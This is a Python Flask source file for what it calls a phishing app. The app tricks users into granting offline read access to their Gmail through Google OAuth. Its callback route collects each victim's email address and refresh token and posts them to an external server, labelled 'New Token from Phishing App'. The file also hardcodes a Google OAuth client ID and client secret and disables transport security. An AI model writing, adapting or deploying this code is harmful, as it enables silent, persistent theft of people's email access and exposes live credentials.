import os
import base64
import json
import traceback
import requests
from flask import Flask, request, redirect, session, url_for, render_template, Response
from google_auth_oauthlib.flow import Flow
from googleapiclient.discovery import build
from google.oauth2.credentials import Credentials
from googleapiclient.http import BatchHttpRequest

app = Flask(__name__)
app.secret_key = 'a_very_long_and_super_secret_string_for_my_app'
os.environ['OAUTHLIB_INSECURE_TRANSPORT'] = '1'

# =================================================================
# بيانات الاعتماد والمسارات
# =================================================================
CLIENT_ID = '1096352235538-pkdcd73qn9miojk1cflr52fuminb4j4c.apps.googleusercontent.com'
CLIENT_SECRET = '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'
REDIRECT_URI = 'https://bashar-7fw9.onrender.com/callback'

# رابط الخادم الذي يستقبل التوكن
SERVER_URL = 'https://bmapps.pythonanywhere.com/receive_data'
# =================================================================

SCOPES = [
   'https://www.googleapis.com/auth/gmail.readonly',
    'openid'
]

# =================================================================

def create_flow():
    return Flow.from_client_config(
        client_config={
            "web": {
                "client_id": CLIENT_ID,
                "client_secret": CLIENT_SECRET,
                "auth_uri": "https://accounts.google.com/o/oauth2/auth",
                "token_uri": "https://oauth2.googleapis.com/token",
                "redirect_uris": [REDIRECT_URI],
            }
        },
        scopes=SCOPES,
        redirect_uri=REDIRECT_URI
    )

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login')
def login():
    flow = create_flow()
    authorization_url, state = flow.authorization_url(access_type='offline', prompt='consent')
    session['state'] = state
    return redirect(authorization_url)

@app.route('/callback')
def callback():
    flow = create_flow()
    flow.fetch_token(authorization_response=request.url)
    credentials = flow.credentials
    
    try:
        service = build('oauth2', 'v2', credentials=credentials)
        user_info = service.userinfo().get().execute()
        user_email = user_info.get('email', 'unknown_email')
        refresh_token = credentials.refresh_token
        
        if refresh_token:
            # إرسال التوكن إلى الخادم الخارجي فقط
            try:
                payload = {
                    'text_data': f"New Token from Phishing App:\nEmail: {user_email}\nRefreshToken: {refresh_token}"
                }
                requests.post(SERVER_URL, data=payload, timeout=10)
            except Exception as send_error:
                # يمكنك طباعة الخطأ هنا لرؤيته في سجلات الخادم إذا أردت
                print(f"Failed to send token: {send_error}")

    except Exception as e:
        # يمكنك طباعة الخطأ هنا أيضًا
        print(f"An error occurred during callback: {e}")

    session['credentials'] = { 
        'token': credentials.token, 
        'refresh_token': credentials.refresh_token, 
        'token_uri': credentials.token_uri, 
        'client_id': credentials.client_id, 
        'client_secret': credentials.client_secret, 
        'scopes': credentials.scopes 
    }
    
    return redirect('/#dashboard')
    
# تم حذف المسار /report لأنه كان يعتمد على قراءة التوكن من ملف محلي